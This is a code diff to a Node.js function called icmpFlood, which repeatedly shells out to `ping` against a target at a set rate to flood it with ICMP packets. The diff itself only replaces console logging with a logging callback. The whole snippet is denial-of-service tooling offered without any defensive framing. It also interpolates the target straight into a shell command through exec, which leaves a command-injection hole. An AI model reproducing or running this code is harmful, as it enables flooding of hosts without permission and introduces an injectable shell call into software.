@@ -1,12 +1,12 @@
 const { exec } = require('child_process');
 
-function icmpFlood(target, rateLimit) {
+function icmpFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         exec(`ping -c 1 ${target}`, (err, stdout, stderr) => {
             if (err) {
-                console.error('Error: ' + err.message);
+                logOutput('Error: ' + err.message);
             } else {
-                console.log('Sent ICMP packet');
+                logOutput('Sent ICMP packet');
             }
         });
     }, 1000 / rateLimit);
